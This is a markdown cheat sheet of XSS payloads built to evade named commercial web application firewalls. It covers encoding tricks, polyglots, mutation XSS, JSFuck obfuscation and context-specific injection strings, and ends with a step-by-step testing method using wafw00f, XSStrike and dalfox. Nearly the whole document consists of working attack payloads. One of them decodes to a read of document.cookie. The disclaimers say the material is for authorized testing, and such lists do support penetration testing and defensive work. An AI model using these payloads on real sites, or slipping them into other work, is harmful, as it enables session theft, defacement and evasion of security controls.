# WAF Bypass XSS Payloads - Comprehensive Collection

## Quick Description
A complete collection of XSS payloads designed to bypass major Web Application Firewalls (WAF) including Cloudflare, AWS, Akamai, and others. Includes encoding techniques, polyglot payloads, context-specific bypasses, and advanced evasion methods for ethical security testing.

⚠️ **DISCLAIMER**: These payloads are for authorized security testing and educational purposes only. Unauthorized testing is illegal.

---

## 1. Cloudflare WAF Bypass

### Basic Bypasses
```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<svg><script>alert(1)</script>
<math><mtext><script>alert(1)</script></mtext></math>
```

### Case Manipulation
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
<SvG/oNlOaD=alert(1)>
<IfrAme sRc=javascript:alert(1)>
```

### Encoding Bypasses
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>
<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

### Unicode Normalization
```html
<img src=x onerror="&#x0061;lert(1)">
<svg/onload="&#x61;lert(1)">
<img src=x onerror="eval('\u0061lert(1)')">
<img src=x onerror="eval('\x61lert(1)')">
```

### Whitespace/Tab Bypasses
```html
<img	src=x	onerror=alert(1)>
<svg/onload%0a=%0aalert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<svg%09onload=alert(1)>
<img%0dsrc=x%0donerror=alert(1)>
```

### Comment Bypasses
```html
<img src=x o<!---->nerror=alert(1)>
<svg/on<!--comment-->load=alert(1)>
<img src=x o/**/nerror=alert(1)>
```

### Attribute Confusion
```html
<img src=1 onerror=alert(1) alt=1 onerror=alert(2)>
<svg onload=alert(1) onload=alert(2)>
<img src=x onerror="alert(1)" onerror="alert(2)">
```

### Protocol Handler Bypasses
```html
<iframe src=javas&#99;ript:alert(1)>
<iframe src="java	script:alert(1)">
<iframe src=java%0script:alert(1)>
<iframe src=j&#97;v&#97;script:alert(1)>
<object data=javascript:alert(1)>
```

### Advanced Cloudflare Bypasses
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<form><button formaction=javascript:alert(1)>Click
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

---

## 2. AWS CloudFront WAF Bypass

### Basic Bypasses
```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<svg/onload=alert`1`>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=Function`al\ert\`1\``>
```

### Template Literals
```html
<img src=x onerror=alert`1`>
<svg/onload=alert`${1}`>
<img src=x onerror=eval`alert\x281\x29`>
<svg onload=setTimeout`alert\x281\x29`>
```

### Encoding Variations
```html
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
<img src=x onerror=\u{61}lert(1)>
<img src=x onerror=eval('\141lert(1)')>
<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>
```

### Function Constructor
```html
<img src=x onerror=Function('alert(1)')()>
<img src=x onerror=Function`a${`alert(1)`}b``>
<svg onload=Function('al'+'ert(1)')()>
<img src=x onerror=[].constructor.constructor('alert(1)')()>
```

### Array Methods
```html
<img src=x onerror=[1].find(alert)>
<img src=x onerror=[1].map(alert)>
<img src=x onerror=[1].forEach(alert)>
<img src=x onerror=[alert].find(x=>x(1))>
```

---

## 3. Akamai WAF Bypass

### Basic Bypasses
```html
<svg><script>alert&#40;1&#41;</script>
<img src=x onerror="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

### Polyglot Payloads
```html
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></script>">'><script>alert(String.fromCharCode(88,83,83))</script>
```

### Event Handler Variations
```html
<body onpageshow=alert(1)>
<body onhashchange=alert(1)>
<body onpopstate=alert(1)>
<body ononline=alert(1)>
<body onoffline=alert(1)>
<body onbeforeunload=alert(1)>
<body onunload=alert(1)>
<body onresize=alert(1)>
<body onstorage=alert(1)>
```

### Data URI Schemes
```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Mixed Case + Encoding
```html
<ImG sRc=x OnErRoR=&#97;&#108;&#101;&#114;&#116;(1)>
<SvG/OnLoAd=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<IfrAmE sRc=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)>
```

---

## 4. Wordfence WAF Bypass

### Basic Bypasses
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### WordPress Specific
```html
<img src=1 onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self['al'+'ert'](1)>
```

### Script-less XSS
```html
<link rel=import href="data:text/html,<script>alert(1)</script>">
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
<iframe srcdoc="<img src=x onerror=alert(1)>">
<iframe src="javascript:parent.alert(1)">
```

### Mutation XSS
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><style><img src=x onerror=alert(1)></style>
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

### Form-based XSS
```html
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>Click
<isindex action=javascript:alert(1) type=submit value=Click>
```

---

## 5. Imperva (Incapsula) WAF Bypass

### Basic Bypasses
```html
<svg><script>&#97;lert(1)</script>
<img src=x onerror=&#x61;lert(1)>
<iframe src=&#x6A;avascript:alert(1)>
<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>
```

### Double Encoding
```html
<img src=x onerror=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(1)>
<svg onload=%26%2397%3Blert(1)>
```

### Splitting Techniques
```html
<img src=x onerror="a"+"lert(1)">
<img src=x onerror='al'+'ert(1)'>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=eval('al'+'ert(1)')>
```

### Expression Evaluation
```html
<img src=x onerror=eval.call(null,'alert(1)')>
<img src=x onerror=eval.apply(null,['alert(1)'])>
<img src=x onerror=Function.call.call(eval,null,'alert(1)')>
```

---

## 6. ModSecurity WAF Bypass

### Basic Bypasses
```html
<img src=/ onerror=alert(1)>
<svg onload=alert(1)//
<img src=x:alert(1) onerror=eval(src)>
<iframe src="javascript:void(alert(1))">
```

### Newline/Carriage Return
```html
<img src=x%0aonerror=alert(1)>
<img src=x%0donerror=alert(1)>
<img src=x%0d%0aonerror=alert(1)>
<svg%0aonload=alert(1)>
```

### NULL Byte Injection
```html
<img src=x%00 onerror=alert(1)>
<svg%00/onload=alert(1)>
<iframe src=java%00script:alert(1)>
```

### Tag Fuzzing
```html
<img src onerror=alert(1)>
<img/src=x/onerror=alert(1)>
<img/src=x//onerror=alert(1)>
<img src=x / onerror=alert(1)>
```

---

## 7. F5 BIG-IP ASM Bypass

### Basic Bypasses
```html
<img src=x onerror=alert(String.fromCharCode(49))>
<svg onload=alert(String.fromCharCode(49))>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### Hex Encoding
```html
<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
<svg onload=\x61\x6c\x65\x72\x74(1)>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
```

### Unicode Escaping
```html
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
```

---

## 8. Barracuda WAF Bypass

### Basic Bypasses
```html
<img src=x onerror="alert`1`">
<svg onload="alert`1`">
<img src=x onerror=alert`1`>
<iframe src="javascript:alert`1`">
```

### Backtick Variations
```html
<img src=x onerror=`alert\x281\x29`>
<svg onload=eval`alert\x281\x29`>
<img src=x onerror=Function`al${'ert(1)'}``>
```

---

## 9. Sucuri WAF Bypass

### Basic Bypasses
```html
<img src=x onerror=alert(/XSS/)>
<svg onload=alert(/XSS/)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=alert(document['domain'])>
```

### Regex Literals
```html
<img src=x onerror=alert(/1/)>
<svg onload=prompt(/1/)>
<img src=x onerror=confirm(/1/)>
```

---

## 10. Universal WAF Bypass Techniques

### String Concatenation
```html
<img src=x onerror=window['ale'+'rt'](1)>
<img src=x onerror=window['al'+String.fromCharCode(101)+'rt'](1)>
<img src=x onerror=eval('al'+'ert(1)')>
<img src=x onerror=Function('al'+'ert(1)')()>
```

### Array/Object Access
```html
<img src=x onerror=window['alert'](1)>
<img src=x onerror=self['alert'](1)>
<img src=x onerror=top['alert'](1)>
<img src=x onerror=parent['alert'](1)>
<img src=x onerror=frames['alert'](1)>
```

### Constructor Methods
```html
<img src=x onerror=[].constructor.constructor('alert(1)')()>
<img src=x onerror=[]['constructor']['constructor']('alert(1)')()>
<img src=x onerror=([])[('constructor')]['constructor']('alert(1)')()>
```

### Octal/Hex Encoding
```html
<img src=x onerror=eval('\141\154\145\162\164\050\061\051')>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
```

### Base64 Encoding
```html
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### JSFuck Style
```html
<img src=x onerror=[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()>
```

---

## 11. Context-Specific Bypasses

### Inside JavaScript String
```javascript
'; alert(1); //
\'; alert(1); //
'; alert(String.fromCharCode(88,83,83)); //
\x27; alert(1); //
\u0027; alert(1); //
```

### Inside HTML Attribute
```html
" onmouseover=alert(1) x="
' onmouseover=alert(1) x='
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
```

### Inside Script Tag
```html
</script><script>alert(1)</script>
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
```

### URL Context
```
javascript:alert(1)
javascript:alert(String.fromCharCode(88,83,83))
javascript:alert`1`
javascript:eval(atob('YWxlcnQoMSk='))
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## 12. Advanced Bypass Techniques

### DOM Clobbering
```html
<form name=alert><input name=1>
<img name=alert src=x onerror=alert(1)>
<form id=alert><input id=1></form><svg onload=alert(1)>
```

### Character Reference Bypass
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
```

### Mixed Encoding
```html
<img src=x onerror=&#x61;l&#101;rt(1)>
<img src=x onerror=\u0061l&#101;rt(1)>
<img src=x onerror=eval('\x61l\145rt(1)')>
```

### Polyglot Ultimate
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## 13. Testing Methodology

### Step 1: Identify WAF
```bash
# Using wafw00f
wafw00f https://target.com

# Manual detection
curl -I https://target.com
nmap -p443 --script http-waf-detect https://target.com
```

### Step 2: Test Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### Step 3: If Blocked, Try Encoding
```html
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=\u0061lert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### Step 4: Try Case Manipulation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Step 5: Use Whitespace/Special Chars
```html
<img	src=x	onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
```

---

## 14. Tools for Testing

### Automated Tools
```bash
# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Dalfox
dalfox url https://target.com/search?q=test

# XSSer
xsser -u "https://target.com/search?q=test" --auto

# Burp Suite Intruder with payload lists
```

### Manual Testing Workflow
1. Intercept request in Burp Suite
2. Send to Intruder
3. Load WAF bypass payload list
4. Analyze responses for successful execution
5. Verify in browser

---

## 15. Important Notes

⚠️ **CRITICAL REMINDERS:**

1. **Authorization Required**: Only test on systems you own or have explicit permission to test
2. **Bug Bounty Programs**: Read the scope and rules carefully
3. **Rate Limiting**: Don't overwhelm the target with requests
4. **Legal Compliance**: Unauthorized testing is illegal
5. **Responsible Disclosure**: Report findings properly through official channels

### Payload Selection Tips
- Start with basic payloads
- Gradually increase complexity
- Document what works
- Understand WHY it bypasses
- Create custom payloads based on context

---

**Author's Note**: This collection is meant for ethical security testing only. Understanding these bypasses helps both attackers (for testing) and defenders (for protection). Always use responsibly and legally.
